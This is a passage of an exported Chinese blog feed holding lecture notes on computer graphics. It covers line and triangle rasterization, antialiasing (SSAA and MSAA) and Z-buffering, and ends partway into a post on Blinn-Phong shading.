    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="什么是光栅化？"><a href="#什么是光栅化？" class="headerlink" title="什么是光栅化？"></a>什么是光栅化？</h2><p>虎书上的解释：</p>
<blockquote>
<p>光栅化是对象顺序图形的中心操作，而光栅化器是任何图形管道的中心。对于输入的每个基元，光栅化器有两个任务：枚举基元覆盖的像素，并在基元上插值，称为属性。这些属性的用途将在后面的示例中明确。光栅化器的输出是一组片段，每个片段对应于基本体覆盖的像素。每个片段“存在”于特定像素处，并携带其自己的一组属性值。</p>
</blockquote>
<p>在上述我们针对摄像机及物体进行MVP变化后，物体被呈现在$[-1,1]^3$的标准空间中，之后经过视口变换将之映射到了$[0,width]*[0,height]$的屏幕上。那么，屏幕又是怎样将物体正确的展示出来的呢？这就是今天所要介绍的光栅化。</p>
<p>个人理解：MVP变化所关注的是如何将物体的正确二维表示通过转换得到，而光栅化的目的就是将想要展现的物体给真正现实到屏幕上的过程（drawing onto the screen）。</p>
<span id="more"></span>

<h2 id="像素和屏幕"><a href="#像素和屏幕" class="headerlink" title="像素和屏幕"></a>像素和屏幕</h2><p>在了解屏幕之前，得知道像素是个什么东西。在我们的日常生活中，常常会接触到像素风格东西的存在，如像素风游戏，像素风图像，共有的特点是所要表现的物体及形象是通过一个个颜色不同而内部均匀的像素块堆叠而成的，与真实的形象神似但是并不确切，因为它很“模糊”。</p>
<p>这是百度对像素的解释：像素是指由图像的小方格组成的，这些小方块都有一个明确的位置和被分配的色彩数值，小方格颜色和位置就决定该图像所呈现出来的样子。</p>
<p>而屏幕其实就是像素的二维数组。我们平常所说的分辨率，如1920 * 1080（1080p）、1280 * 720（720p）、2k、4k，就是像素数组的大小。像素点越多，像素数组越大，屏幕分辨率越高。屏幕是典型的光栅显示。</p>
<p>屏幕的像素如何表示呢？</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707191020581.png" alt="image-20220707191020581" style="zoom:50%;" loading="lazy">

<ul>
<li>每个像素以方块形式呈现，默认长宽均为单位长度，坐标表示为左下角的坐标，故范围为$(0,0)$到$(width-1,height-1)$</li>
<li>像素中心点坐标即为像素坐标，数值表示为$(x+0.5,y+0.5)$</li>
<li>整个屏幕表示范围为$(0,0)$到$(width,height)$</li>
</ul>
<h2 id="直线光栅化（Linear-Rasterization）"><a href="#直线光栅化（Linear-Rasterization）" class="headerlink" title="直线光栅化（Linear Rasterization）"></a>直线光栅化（Linear Rasterization）</h2><h3 id="DDA数值微分算法"><a href="#DDA数值微分算法" class="headerlink" title="DDA数值微分算法"></a>DDA数值微分算法</h3><p>DDA算法是一个非常简单直观的算法。</p>
<p>首先当任何一条直线知道任意两点时都可以用 $y&#x3D;kx+b$ 来表示，其中 $k$ 代表斜率，如果$∣k∣ &lt; 1$，那么它的主要行进方向就是 $x$ 轴，即 $x$ 轴的变化要比 $y$ 轴快；相反如果 $∣k∣ &gt; 1$ ，那么它的主要行进方向就是 $y$ 轴，即 $y$ 轴的变化要比 $x$ 轴快。如下图所示：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200409201228492.png" alt="img" style="zoom: 80%;" loading="lazy">

<p>我们分别就图上两种情况进行考虑(假设起点与终点给定)</p>
<p>① 当$∣k∣ &lt; 1$时，从起点开始画起每次 $x &#x3D; x+1$， $y &#x3D; y+k$，并将 $y$ 四舍五入，得到新的 $x，y$ 就是像素点应该画的地方<br>② 当$∣k∣ &gt; 1$时，从起点开始画起每次 $y &#x3D; y+1$， $x &#x3D; x+\frac{1}{k}$，并将 $x$ 四舍五入，得到新的$x，y$ 就是像素点应该画的地方</p>
<h3 id="中点Bresenham算法"><a href="#中点Bresenham算法" class="headerlink" title="中点Bresenham算法"></a>中点Bresenham算法</h3><p>我们首先规定想要光栅化的线段的起点$P_0(x_0,y_0)$与终点$P_1(x_1,y_1)$则该直线方程可以用 $y &#x3D; kx + b$ 的形式来表示，定义 $f ( x , y ) &#x3D; y − k x − b$</p>
<p>中点Bresenham算法的思想其实也比较简单，在这里只给出 $0 &lt; k &lt; 1$的情况，其它情况可以类推，除却起点与终点，我们每次的画点只会考虑右边或者右上的点两种情况(由斜率所决定的)，因此我们只需要在这二者之间做出选择。那么该依据什么进行判断呢，给出如下两种情况：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707192843900.png" alt="image-20220707192843900" style="zoom: 33%;" loading="lazy">

<p>我们已经成功画出了前三个深色方格之后，所要考虑的便是第三个深色方格右边或者右上的浅色方格，此时我们取这两个浅色方格的中点，如图中圆圈符号所对应的那个点，倘若这个点在直线方程的下面，那么很明显我们应该选择右上的方格。</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707192954049.png" alt="image-20220707192954049" style="zoom:33%;" loading="lazy">

<p>此时中点位于直线方程的上方，此时选择右边的浅色方格。</p>
<p>至此，如何判断两种方格选择的条件已很明显，就是确定中点与直线的位置关系，这里就可以使用到一开始定义的$f ( x , y ) &#x3D; y − k x − b$的方程了。显然，当 $f(x+1,y+0.5) &gt; 0$的时候中点在直线上方，当$f(x+1,y+0.5) &lt; 0$的时候中点在直线下方 。（其中 $x+1$，$y+0.5$是为了表示两个浅色方格的中点，此时 $x，y$为前一个确定的像素坐标）</p>
<p>伪代码如下：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410090050374.png" alt="img" style="zoom:33%;" loading="lazy">

<p>明显地，some condition是：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410090315495.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>该算法仍有优化，在此不做讨论。</p>
<h2 id="三角形光栅化（Triangle-Rasterization）"><a href="#三角形光栅化（Triangle-Rasterization）" class="headerlink" title="三角形光栅化（Triangle Rasterization）"></a>三角形光栅化（Triangle Rasterization）</h2><h3 id="为什么是三角形？"><a href="#为什么是三角形？" class="headerlink" title="为什么是三角形？"></a>为什么是三角形？</h3><p>为什么着重讨论三角形光栅化？</p>
<ul>
<li>是最基础的多边形，任意多边形都可以拆分成三角形</li>
<li>可以保证在平面</li>
<li>三角形内外部定义明确，有利于像素的着色</li>
<li>用于在三角形顶点处插值的明确定义方法（重心插值）（ps：这个闫老师没有细说，可以参考这个博主的<a href="https://blog.csdn.net/qq_38065509/article/details/105446756?spm=1001.2014.3001.5502">重心坐标系</a>）</li>
</ul>
<h3 id="如何光栅化"><a href="#如何光栅化" class="headerlink" title="如何光栅化"></a>如何光栅化</h3><p>要想实现三角形光栅化，需要<strong>采样</strong>（sampling）。</p>
<p>图示为：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410092809549.png" alt="img" style="zoom:50%;" loading="lazy">

<p>程序语言为：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> x <span class="token operator">&lt;</span> xmax <span class="token punctuation">;</span> <span class="token operator">++</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> y <span class="token operator">&lt;</span> ymax <span class="token punctuation">;</span> <span class="token operator">++</span>y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//遍历每个像素点</span>
		image<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">inside</span><span class="token punctuation">(</span>tri<span class="token punctuation">,</span>x<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//在三角形内部的像素点作为采样对象</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们对屏幕中的每一个像素进行采样，如果这个像素点在三角形之中那么这个像素点就应该被采用。那么该如何去判断一个点在不在三角形内部呢，如何实现上述的 inside 函数呢？最经典的方法就是利用叉乘了。</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410092948108.png" alt="img" style="zoom:50%;" loading="lazy">

<p>我们从$P_2$按照顺时针顺序来看，直线$P_2P_1$与直线$P_2Q$的叉乘，利用右手定则，指向屏幕内，说明点 $Q$ 在直线$P_2P_1$的右侧。同理直线$P_1P_0$与直线$P_1Q$的叉乘，得点 $Q$ 在直线$P_1P_0$的右侧，而最后得到点 $Q$ 在直线$P_0P_2$的左侧。说明点 $Q$ 在三角形外部。（当点均在三线一侧时才位于内部）</p>
<p>因此，三角形光栅化只需要遍历每一个点，判断是否位于其内部即可。当然我们还可以进一步的进行优化，因为显然并没有必要去测试屏幕中的每一个点，一个三角形面可能只占屏幕很小的部分，可以利用一个bouding box包围住想要测试的三角形，只对该bounding box内的点进行采样测试，如下图：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/20200410093933601.png" alt="img" style="zoom:67%;" loading="lazy">

<h2 id="光栅化带来的锯齿-x2F-走样（Aliasing）"><a href="#光栅化带来的锯齿-x2F-走样（Aliasing）" class="headerlink" title="光栅化带来的锯齿&#x2F;走样（Aliasing）"></a>光栅化带来的锯齿&#x2F;走样（Aliasing）</h2><p>利用上述光栅化，我们可以得到三角形在屏幕上的呈现是这样的：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707195907949.png" alt="image-20220707195907949" style="zoom: 67%;" loading="lazy">

<p>呃呃，效果一言难尽。经常玩游戏的人应该都知道这种图形的呈现称作锯齿，就是十分的不平整光滑，看得人十分难受。在图形学中，更学术的名称为走样。问题的本质是：采样的频率过低无法跟上图像的频率。大白话就是采样数过少，试想如果像素点足够多，采样数足够大，那么精细度就会越高，一个个的锯齿将会变得十分小至肉眼无法分辨，这样看上去就是平整光滑的了。</p>
<p>下面理解一下锯齿&#x2F;走样产生的本质：采样的频率过低无法跟上图像的频率。</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707201104641.png" alt="image-20220707201104641" style="zoom:50%;" loading="lazy">

<p>$f_1(x)$到$f_5(x)$的频率不断增加而采样的频率不变，可见由采样点预估出的曲线越来越失真。</p>
<p>如何抗锯齿&#x2F;反走样呢？这就是我们接下来要讨论的问题。</p>
<h2 id="如何抗锯齿-x2F-反走样？（Antialiasing）"><a href="#如何抗锯齿-x2F-反走样？（Antialiasing）" class="headerlink" title="如何抗锯齿&#x2F;反走样？（Antialiasing）"></a>如何抗锯齿&#x2F;反走样？（Antialiasing）</h2><p>抗锯齿&#x2F;反走样的基本思路是：模糊</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707200721462.png" alt="image-20220707200721462" style="zoom:50%;" loading="lazy">

<p>如图示，我们将三角形模糊之后再进行采样，而采样的像素深度同模糊后的图像颜色。</p>
<p>更明显的两个例子：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707200839977.png" alt="image-20220707200839977" style="zoom:33%;" loading="lazy">

<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707200906732.png" alt="image-20220707200906732" style="zoom: 33%;" loading="lazy">

<p>这边闫老师说了很多拓展知识，例如时域和频域的转换。其中，采样对应的时域像素点的乘积等于图像对应的频域与低频滤波的卷积，二者都可以达到模糊的效果。</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707201516250.png" alt="image-20220707201516250" style="zoom:67%;" loading="lazy">

<p>总之，解决问题的方法是用有限离散的像素点去逼近连续的三角形。具体工业采用什么方法呢？</p>
<h3 id="超采样反走样-Super-Sampling-Anti-Aliasing，SSAA"><a href="#超采样反走样-Super-Sampling-Anti-Aliasing，SSAA" class="headerlink" title="超采样反走样(Super Sampling Anti-Aliasing，SSAA)"></a>超采样反走样(Super Sampling Anti-Aliasing，SSAA)</h3><p>这是最基本的抗锯齿模式，实现原理是渲染时把画面按照显示器分辨率的若干倍放大，如在1024x768分辨率上开启2xSSAA，GPU会先渲染2048x1536 图像，再“塞进”1024x768的边框里成型，将画面精细度提升一倍，毫无疑问会改善边缘锯齿情况。但是众所周知，高分辨率图形的渲染会极大的消耗GPU运算资源和显存容量及带宽，因此SSAA资源消耗极大，即使是最低的2x也未必就能轻易承受。</p>
<p>举例：此方法无非就是提高分辨率，即增加采样点。将每个像素点细分成了4个采样点：</p>
<p><img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707202417081.png" alt="image-20220707202417081" loading="lazy"></p>
<p>之后根据每个采样点来进行着色，每有一个采样点被覆盖就着一次色。这样得到了每个采样点的颜色之后，我们讲每个像素点内部所细分的采样点的颜色值全部加起来再求均值，作为该像素点的抗走样之后的颜色值。结果如下：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/2020041818065221.png" alt="img" style="zoom:50%;" loading="lazy">

<p>仔细观察可以发现因为将4个采样点的颜色求均值的之后，靠近三角形边缘的像素点有的变淡了，从宏观角度来看的话，这个锯齿就会变得不那么明显了。玩3A游戏时我们可以发现会有SSAA抗锯齿选项，其下的 ×2 , ×3 , ×4 分别代表的就是4个，9个，16个采样点，显然采样点越多抗锯齿效果越好，但计算负担也会随之增加。</p>
<h3 id="多采样反走样-Multi-Sampling-Anti-Aliasing，MSAA"><a href="#多采样反走样-Multi-Sampling-Anti-Aliasing，MSAA" class="headerlink" title="多采样反走样(Multi Sampling Anti-Aliasing，MSAA)"></a>多采样反走样(Multi Sampling Anti-Aliasing，MSAA)</h3><p>MSAA是SSAA的改进版。SSAA仅仅为了边缘平滑，而不得不重新以数倍的 分辨率渲染整个画面，造成宝贵显卡处理资源的极大浪费，因此MSAA正是为了改善这种情况而生。MSAA实现方式类似于SSAA，不同之处在于MSAA仅仅将3D建模的边缘部分放大处理，而不是整个画面。简单说3D模型是由大量多边形所组成，MSAA仅仅处理模型最外层的多边形，因此显卡的负担大幅减轻。 </p>
<p> MSAA虽然趋于易用化，十分流行，但是缺点也很明显。1，如果画面中单位物体较多，需要处理的边缘多边形数量也自然增多，此时MSAA性能也会下降的十分厉害。2，同样倍数的MSAA，理论上边缘平滑效果与SSAA相同，但是由于仅仅处理边缘部分的多边形，因此非边缘部分的纹理锐度远不如SSAA。</p>
<p>同样利用上述的例子说明MSAA与SSAA区别，MSAA仍将像素分为多个采样点，不同的是不再采用每有一个采样点被覆盖就着一次色的，而是统计被覆盖采样点的个数，例如有两个采样点被覆盖，那么只需要用该像素中心计算出来的颜色值乘以50%即可，这样大大减少了计算量。如上述：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707203755079.png" alt="image-20220707203755079" style="zoom:50%;" loading="lazy">

<h2 id="深度缓冲（Z-Buffer）"><a href="#深度缓冲（Z-Buffer）" class="headerlink" title="深度缓冲（Z-Buffer）"></a>深度缓冲（Z-Buffer）</h2><p>在第二节课堂笔记视图变换中的视口变换模块说过这么一句话：</p>
<blockquote>
<p>对于标准立方体$[ − 1 , 1 ]^3$，先不管它的 $Z$ 轴数据（由深度缓冲来处理）</p>
</blockquote>
<p>深度缓冲是什么？</p>
<p>接着上文，我们在处理完图形光栅化之后，还要考虑物体先后的关系？这十分重要，更直白的说法是，要搞清楚物体的图层，哪个物体会被哪个物体遮挡，哪个物体会遮挡哪个物体。具体的说每个像素点所对应的可能不止一个三角形面上的点，该选择哪个三角形面上的点来显示呢？</p>
<p>当然是离摄像头最近的像素点显示，这就需要用到深度缓冲。（3D物体的远近通过 $Z$ 轴表示，故又称Z-Buffer）</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707203932545.png" alt="image-20220707203932545" style="zoom:50%;" loading="lazy">

<p>简单的图示，离摄像机越近的像素点颜色越深。如何实现呢？分为两步：</p>
<p><strong>1. Z-Buffer算法需要为每个像素点维持一个深度数组记为zbuffer，其每个位置初始值置为无穷大（即离摄像机无穷远）。</strong><br><strong>2. 随后我们遍历每个三角形面上的每一个像素点[x,y]，如果该像素点的深度值z，小于zbuffer[x,y]中的值，则更新zbuffer[x,y]值为该点深度值z，并同时更新该像素点[x,y]的颜色为该三角形面上的该点的颜色。</strong></p>
<p>伪代码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">Initialize depth buffer to ∞
During rasterization<span class="token operator">:</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span>each triangle T<span class="token punctuation">)</span>
		<span class="token keyword">for</span><span class="token punctuation">(</span>each <span class="token function">sample</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span> in T<span class="token punctuation">)</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span>z <span class="token operator">&lt;</span> zbuffer<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>              <span class="token comment">//目前为止离摄像机最近的</span>
				framebuffer<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> rgb<span class="token punctuation">;</span>       <span class="token comment">//更新颜色</span>
				zbuffer<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> z<span class="token punctuation">;</span>             <span class="token comment">//更新深度</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一个形象的例子：</p>
<img src="/2022/07/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%89%EF%BC%9A%E5%85%89%E6%A0%85%E5%8C%96-Rasterization/image-20220707204535135.png" alt="image-20220707204535135" style="zoom: 50%;" loading="lazy">

<p>数字代表深度，越小代表离相机越近，实现像素颜色的更新。</p>
]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>光栅化</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机图形学四：着色-Shading</title>
    <url>/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="什么是shading？"><a href="#什么是shading？" class="headerlink" title="什么是shading？"></a>什么是shading？</h1><p>在光栅化模块中，我们于抗锯齿的SSAA方法种提到了<strong>着色（shading）</strong>这一词。着色是一个很重要的环节，它负责计算出颜色（光栅化只是填充像素格，换句话说是负责转移颜色到屏幕），换句话说着色就是计算出每个采样像素点的颜色是多少。着色计算要考虑的因素通常有：光照、纹理、着色频率（着色单位）等。</p>
<span id="more"></span>

<h1 id="Blinn-phong-反射模型（reflection-model）"><a href="#Blinn-phong-反射模型（reflection-model）" class="headerlink" title="Blinn-phong 反射模型（reflection model）"></a>Blinn-phong 反射模型（reflection model）</h1><p>Blinn-Phong光照模型，又称为Blinn-phong反射模型（Blinn–Phong reflection model）或者 phong修正模型（modified Phong reflection model），是由 Jim Blinn于 1977 年在文章中对传统 phong光照模型基础上进行修改提出的。<strong>它是一个经验模型，并不完全符合真实世界中的光照现象</strong>，但由于实现起来简单方便，并且计算速度和得到的效果都还不错，因此在早期被广泛的使用。</p>
<p>它将进入摄像机的光线分为三个部分，每个部分使用一种方法来计算它的贡献度，这三个部分分别是**环境光(Ambient)、漫反射(Diffuse)和高光反射(Specular)**。如下图：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200422202039268.png" alt="img" style="zoom:50%;" loading="lazy">

<p>在计算之前，我们先定义一些基本的向量，因为只表示方向，默认它们都为单位向量：</p>
<ul>
<li><code>Viewer direction</code>，观察方向，使用<code>v</code>表示</li>
<li><code>Surface normal</code>，法线方向，使用<code>n</code>表示</li>
<li><code>Light direction</code>，光线方向，使用<code>l</code>(小写的<code>L</code>)表示</li>
</ul>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/v2-62c91756b8b182383578c6708db35da4_720w.jpg" alt="img" style="zoom: 80%;" loading="lazy">

<h2 id="漫反射（Diffuse-reflection）"><a href="#漫反射（Diffuse-reflection）" class="headerlink" title="漫反射（Diffuse reflection）"></a>漫反射（Diffuse reflection）</h2><p>首先搞清什么是漫反射：是投射在粗糙表面上的光向各个方向反射的现象。当一束平行的入射光线射到粗糙的表面时，表面会把光线向着四面八方反射，所以入射线虽然互相平行，由于各点的法线方向不一致，造成反射光线向不同的方向无规则地反射，这种反射称之为“漫反射”或“漫射”。正是<strong>因为反射是完全随机的，因此可以认为漫反射光在任何反射方向上的分布都是一样的</strong>，如下图所示：</p>
<img src="https://img-blog.csdnimg.cn/20200422204409870.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>那影响漫反射光照强度的因素有哪些呢？</p>
<ul>
<li>入射光线与法线的夹角(入射光线角度)</li>
<li>入射光线自身的强度</li>
</ul>
<p><strong>入射光线与法线的夹角</strong></p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200422204708204.png" alt="img" style="zoom:50%;" loading="lazy">

<p>从图中可以明显看出：只有当入射光线与平面垂直的时候才能完整的接受所有光的能量，而入射角度越倾斜，平面接收的光越少，损失的能量越大。定量的来说，应该将光强乘上一个$cos\theta &#x3D; n⋅l$（因为 $n⋅l&#x3D;|n|\cdot|l|cos\theta$，而 $n、l$ 为单位向量，长度为1），这样才能正确表示平面所接收的所有光照。</p>
<p><strong>入射光线自身的强度</strong></p>
<p>光的强度会随着距离的增加而衰减，这是显而易见的。假设我们有一个光源，在距离它单位1的圆上(图中最内圈)每一个点接收到光的强度是 $I$ 。那么根据能量守恒定律，且不考虑衰减，在距离光源 $r$ 位置的圆上每个点接收到光的强度就是 $\frac{I}{r^2}$ （这里是3D模型，故考虑的是光散射的圆壳的面积）。</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/v2-cf10003ade85062c1e6b824c9bbc63a6_720w.jpg" alt="img" style="zoom: 67%;" loading="lazy">

<p>至此，我们可以较好的得到漫反射的模型：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200422205546795.png" alt="img" style="zoom:67%;" loading="lazy">

<p>其中 $L_d$为漫反射光照，$k_d$ 为物体表面的反射系数（reflection coefficient），$\frac{I}{r^2}$ 是当前点接受的光照强度，$max(0，n\cdot l)$是当前点接受到的能量。为什么当前接受到的能量要这么表示？试想如果光照从着色点底部入射，那么其与法线的夹角就会大于90°，值会变成负数没有意义，此种情况下我们默认漫反射光照为0。</p>
<p>什么是反射系数 $k_d$ ？</p>
<blockquote>
<p>反射系数指光（入射光）投向物体时，其表面反射光的强度与入射光的强度之比值（有多少入射光能够被反射出去，其值介于0~1之间），受入射光的投射角度、强度、波长、物体表面材料的性质以及反射光的测量角度等因素影响。一般来讲，在颜色系列中，黑色的反射系数较小，为0.03，白色的反射系数较大，为0.8。</p>
</blockquote>
<p>简要来说，$K_d$与颜色有关，这一点将在下面的部分着重讨论。</p>
<p>同时，我们观察漫反射公式可以发现，漫反射光照与观察方向<code>v</code>没有关系。这是可以理解的，因为<strong>漫反射光在任何反射方向上的分布都是一样的</strong>，所以无论在哪个方向观测，只要入射光线强度不变、入射光线与法线夹角不变，漫反射光照均相同。</p>
<h2 id="镜面-x2F-高光反射（Specular-highlights）"><a href="#镜面-x2F-高光反射（Specular-highlights）" class="headerlink" title="镜面&#x2F;高光反射（Specular highlights）"></a>镜面&#x2F;高光反射（Specular highlights）</h2><p>高光反射也称为镜面反射，若物体表面很光滑，当平行入射的光线射到这个物体表面时，仍会平行地向一个方向反射出来。</p>
<p>初中物理知识可以知道，镜面反射知道入射方向和法线方向就可以得到反射方向。如下图中一根入射光线，照射在光滑的平面上，会沿着$R$ 方向反射，由于平面并非完全光滑，所以反射光的方向并非只有$R$ 一个点，而是 $R$ 周边的一小块区域，只要眼睛(摄像机)在 $R$ 附近都可以看得到，越靠近 $R$ 反射光照强度越大。我们可以得出一条结论：<strong>高光反射和观察角度有关。</strong></p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/v2-22d84d377dbb0d1d520f50a9ff560d14_720w.jpg" alt="img" style="zoom:80%;" loading="lazy">

<p><strong>phong模型中认为，高光反射的强度与反射光线 $R$ 和观察角度 $v$ 之间夹角的余弦值成正比。</strong>事实上，这个角度是不好求的，如何用简便的方法来近似计算呢？我们可以想象：$l$ 和 $v$ 的平分向量为 $h$ ，当 $v$ 离 $R$ 越近时，$n$ 就离 $h$ 越近，而 $h$ 是十分好求的，即向量 $l$ 和 $v$ 之和的单位方向向量，我们称之为半程向量，数量表示为：<br>$$<br>h &#x3D; bisector(v,l)&#x3D;\frac{v+l}{||v+l||}<br>$$</p>
<p>图示为：</p>
